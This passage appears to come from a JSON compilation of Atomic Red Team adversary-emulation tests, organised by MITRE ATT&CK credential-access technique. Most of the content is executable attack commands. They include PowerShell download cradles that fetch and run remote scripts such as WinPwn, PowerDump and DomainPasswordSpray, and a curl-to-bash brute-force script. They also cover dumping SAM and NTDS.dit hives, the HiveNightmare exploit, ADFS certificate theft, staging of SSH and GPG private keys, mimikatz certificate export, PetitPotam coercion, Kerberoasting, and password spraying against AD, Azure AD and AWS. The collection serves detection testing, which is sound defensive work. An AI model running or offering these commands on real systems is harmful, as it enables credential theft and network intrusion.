         "tactic": "credential-access",
         "description": "Kerberoasting technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Kerberoasting -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1558.003",
         "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
         "tactic": "credential-access",
         "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n",
         "command": "Add-Type -AssemblyName System.IdentityModel; $ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\""
      }
   ],
   "T1003.002": [
      {
         "technique_id": "T1003.002",
         "technique_name": "OS Credential Dumping: Security Account Manager",
         "tactic": "credential-access",
         "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
         "command": "reg save HKLM\\sam %temp%\\sam && reg save HKLM\\system %temp%\\system && reg save HKLM\\security %temp%\\security"
      },
      {
         "technique_id": "T1003.002",
         "technique_name": "OS Credential Dumping: Security Account Manager",
         "tactic": "credential-access",
         "description": "Executes a hashdump by reading the hashes from the registry.",
         "command": "if (Test-Path \"C:\\Users\\puma-4\\Desktop\\PowerDump.ps1\") { ; } else {New-Item -Type Directory \"C:\\Users\\puma-4\\Desktop\\\" -ErrorAction ignore -Force | Out-Null; Invoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"C:\\Users\\puma-4\\Desktop\\PowerDump.ps1\"};  ;  Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green; Import-Module \"C:\\Users\\puma-4\\Desktop\\PowerDump.ps1\"; Invoke-PowerDump"
      },
      {
         "technique_id": "T1003.002",
         "technique_name": "OS Credential Dumping: Security Account Manager",
         "tactic": "credential-access",
         "description": "Parses registry hives to obtain stored credentials\n",
         "command": "pypykatz live registry"
      },
      {
         "technique_id": "T1003.002",
         "technique_name": "OS Credential Dumping: Security Account Manager",
         "tactic": "credential-access",
         "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
         "command": "1..10 | % { ;  try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } catch {};  ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore; }"
      },
      {
         "technique_id": "T1003.002",
         "technique_name": "OS Credential Dumping: Security Account Manager",
         "tactic": "credential-access",
         "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
         "command": "for /L %a in (1,1,10) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\SAM\" %temp%\\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\\SAMvss*"
      },
      {
         "technique_id": "T1003.002",
         "technique_name": "OS Credential Dumping: Security Account Manager",
         "tactic": "credential-access",
         "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); samfile -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1003.002",
         "technique_name": "OS Credential Dumping: Security Account Manager",
         "tactic": "credential-access",
         "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n",
         "command": "esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM"
      }
   ],
   "T1003.003": [
      {
         "technique_id": "T1003.003",
         "technique_name": "OS Credential Dumping: NTDS",
         "tactic": "credential-access",
         "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n",
         "command": "if not exist C:\\Windows\\Temp  ( call ) ELSE ( mkdir C:\\Windows\\Temp ) &&   &&  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE"
      },
      {
         "technique_id": "T1003.003",
         "technique_name": "OS Credential Dumping: NTDS",
         "tactic": "credential-access",
         "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n",
         "command": "wmic /node:\"localhost\" process call create \"cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit\""
      },
      {
         "technique_id": "T1003.003",
         "technique_name": "OS Credential Dumping: NTDS",
         "tactic": "credential-access",
         "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n",
         "command": "vssadmin.exe create shadow /for=C: && mklink /D C:\\Temp\\vssstore \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
      },
      {
         "technique_id": "T1003.003",
         "technique_name": "OS Credential Dumping: NTDS",
         "tactic": "credential-access",
         "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
         "command": "mkdir C:\\Windows\\Temp\\ntds_T1003 && ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q"
      },
      {
         "technique_id": "T1003.003",
         "technique_name": "OS Credential Dumping: NTDS",
         "tactic": "credential-access",
         "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
         "command": "wmic shadowcopy call create Volume=C:\\"
      },
      {
         "technique_id": "T1003.003",
         "technique_name": "OS Credential Dumping: NTDS",
         "tactic": "credential-access",
         "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
         "command": "vssadmin.exe create shadow /for=C:"
      },
      {
         "technique_id": "T1003.003",
         "technique_name": "OS Credential Dumping: NTDS",
         "tactic": "credential-access",
         "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
         "command": "(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')"
      },
      {
         "technique_id": "T1003.003",
         "technique_name": "OS Credential Dumping: NTDS",
         "tactic": "credential-access",
         "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
         "command": "wmic /node:\"localhost\" shadowcopy call create Volume=C:\\"
      }
   ],
   "T1552.004": [
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Discover private SSH keys on a macOS or Linux system.\n",
         "command": "find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt; exit 0"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
         "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) ; certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
         "command": "Import-Module AADInternals -Force; Export-AADIntADFSCertificates; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"}; Write-Host \"`nCertificates retrieved successfully\""
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
         "command": "Import-Module ActiveDirectory -Force ; Import-Module AADInternals -Force | Out-Null; $dcServerName = (Get-ADDomainController).HostName; $svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"; $PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList; $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex; $ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server; $Configuration = [xml]$ADFSConfig; $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group; $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName; $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn; $base = \"LDAP://CN=$group,$container,$parent\"; $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base)); $ADSearch.Filter = '(name=CryptoPolicy)'; $ADSearch.PropertiesToLoad.Clear(); $ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null; $aduser = $ADSearch.FindOne(); $keyObjectGuid = $ADUser.Properties[\"displayName\"] ; $ADSearch.PropertiesToLoad.Clear(); $ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null; $ADSearch.Filter=\"(l=$keyObjectGuid)\"; $aduser=$ADSearch.FindOne() ; $key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] ; Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"}; Write-Host \"`nCertificates retrieved successfully\""
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n",
         "command": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText; $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; Set-Location Cert:\\LocalMachine\\My; Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\\atomicredteam.pfx -Password $mypwd"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n",
         "command": "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\; exit 0"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n",
         "command": "mkdir /tmp/GnuPG; find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\; exit 0"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n",
         "command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; Set-Location Cert:\\LocalMachine\\My; Export-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\AtomicRedTeam.cer"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n",
         "command": "mkdir /tmp/art-staging; find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \\; exit 0"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n",
         "command": "dir c:\\ /b /s .key | findstr /e .key"
      },
      {
         "technique_id": "T1552.004",
         "technique_name": "Unsecured Credentials: Private Keys",
         "tactic": "credential-access",
         "description": "Find private keys on the file system",
         "command": "foreach($i in @(\".key\",\".pgp\",\".gpg\",\".ppk\",\".p12\",\".pem\",\".pfx\",\".cer\",\".p7b\",\".asc\",\".crt\")){Get-ChildItem -Path c:\\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match \"$i$\"}}\n"
      }
   ],
   "T1555.004": [
      {
         "technique_id": "T1555.004",
         "technique_name": "Credentials from Password Stores: Windows Credential Manager",
         "tactic": "credential-access",
         "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n",
         "command": "vaultcmd /listcreds:\"Windows Credentials\""
      },
      {
         "technique_id": "T1555.004",
         "technique_name": "Credentials from Password Stores: Windows Credential Manager",
         "tactic": "credential-access",
         "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'); Invoke-WCMDump"
      }
   ],
   "T1110.001": [
      {
         "technique_id": "T1110.001",
         "technique_name": "Brute Force: Password Guessing",
         "tactic": "credential-access",
         "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
         "command": "useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash"
      },
      {
         "technique_id": "T1110.001",
         "technique_name": "Brute Force: Password Guessing",
         "tactic": "credential-access",
         "description": "Bruteforce a single user's password from a wordlist\n",
         "command": "C:\\Users\\puma-4\\Desktop\\kerbrute_windows_386.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteuser.txt TestUser1"
      },
      {
         "technique_id": "T1110.001",
         "technique_name": "Brute Force: Password Guessing",
         "tactic": "credential-access",
         "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
         "command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {;   Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\";   exit 1; }; [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389); $passwordList = Get-Content -Path \"5cb955_passwords.txt\"; foreach ($password in $passwordList){;   $credz = new-object System.Net.NetworkCredential(\"$ENV:USERNAME\", $password, \"$env:UserDnsDomain\");   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host \" [-] Attempting ${password} on account $ENV:USERNAME.\";     $conn.bind();     Write-Host \" [!] $ENV:USERNAME:${password} are valid credentials!\";   } catch {;     Write-Host $_.Exception.Message;   }; }; Write-Host \"End of bruteforce\""
      },
      {
         "technique_id": "T1110.001",
         "technique_name": "Brute Force: Password Guessing",
         "tactic": "credential-access",
         "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n",
         "command": "echo Password1> passwords.txt && echo 1q2w3e4r>> passwords.txt && echo Password!>> passwords.txt && echo Spring2022>> passwords.txt && echo ChangeMe!>> passwords.txt && @FOR /F \"delims=\" %p in (passwords.txt) DO @net use %logonserver%\\IPC$ /user:\"%userdomain%\\#{user}\" \"%p\" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\\IPC$ > NUL"
      },
      {
         "technique_id": "T1110.001",
         "technique_name": "Brute Force: Password Guessing",
         "tactic": "credential-access",
         "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \"art\" user with a password of \"password123\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user\n",
         "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash"
      },
      {
         "technique_id": "T1110.001",
         "technique_name": "Brute Force: Password Guessing",
         "tactic": "credential-access",
         "description": "Attempt to brute force Azure AD user via AzureAD powershell module.\n",
         "command": "Import-Module -Name AzureAD; $passwords = \"Password1`n1q2w3e4r`nPassword!\".split(\"{`n}\"); foreach($password in $passwords) {;   $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force;   $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword;   try {;     Write-Host \" [-] Attempting ${password} on account bruce.wayne@contoso.com.\";     Connect-AzureAD -Credential $Credential 2>&1> $null;     Write-Host \" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\";     break;   } catch {;     Write-Host \" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\";   }; }; Write-Host \"End of bruteforce\""
      }
   ],
   "T1187": [
      {
         "technique_id": "T1187",
         "technique_name": "Forced Authentication",
         "tactic": "credential-access",
         "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n",
         "command": "& \"C:\\Users\\puma-4\\Desktop\\PetitPotam.exe\" 10.0.0.3 10.0.0.2 1; Write-Host \"End of PetitPotam attack\""
      },
      {
         "technique_id": "T1187",
         "technique_name": "Forced Authentication",
         "tactic": "credential-access",
         "description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); Invoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\""
      }
   ],
   "T1110.003": [
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",
         "command": "if not exist %temp%\\users.txt  ( call ) ELSE ( \"PathToAtomicsFolder\\T1110.003\\src\\parse_net_users.bat\" ) &&   &&  @FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL"
      },
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force"
      },
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/\n",
         "command": "cd /tmp; git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git; cd /tmp/GoAWSConsoleSpray; go run main.go GoAWSConsoleSpray -a XXXXXXXX -u ebe7eb_aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt"
      },
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
         "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) { ; } else {Write-Host -NoNewLine \"Reading Users.\"; $netOutput = net users /domain; $netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]); $userLimit = 200; $usercount = 0; foreach ($line in $netOutput) {;   if($usercount -ge $userLimit){break};   $line = $line.trim();   $line = $line -split '\\s\\s+';   foreach ($user in $line){;     if($usercount -ge $userLimit){break};     Add-Content $env:Temp\\usersdpsLight.txt $user;     $usercount = $usercount + 1;     }  ; }; Write-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"};  ;  function Invoke-dpsLight ($Password, $userlist) {; $users = Get-Content $userlist; $Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName; foreach ($User in $users) {;   $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password);   if ($Domain_check.name -ne $null) {;     Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\";   };   else { Write-Host \". \" -NoNewline}; }; Write-Host -ForegroundColor green \"Finished\"; }; Invoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt"
      },
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n",
         "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; ($Users = Get-AzureADUser -All $true) > $null; Disconnect-AzureAD > $null; $PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force; $Users | Foreach-Object {;   $user = $_.UserPrincipalName;   $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword;   try {;     Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\";     Connect-AzureAD -Credential $Credential 2>&1> $null;     Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\";     Disconnect-AzureAD > $null;   } catch {;     Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\";   }; }; Write-Host \"End of password spraying\""
      },
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "DomainPasswordSpray Attacks technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); domainpassspray -consoleoutput -noninteractive -emptypasswords"
      },
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "Test a single password against a list of users\n",
         "command": "C:\\Users\\puma-4\\Desktop\\kerbrute_windows_amd64.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain \"C:\\Users\\puma-4\\Desktop\\passwordspray.txt\" password132"
      },
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n",
         "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"; Invoke-MSOLSpray -UserList \"$env:temp\\T1110.003UserList.txt\" -Password \"P@ssword1\""
      },
      {
         "technique_id": "T1110.003",
         "technique_name": "Brute Force: Password Spraying",
         "tactic": "credential-access",
         "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n",
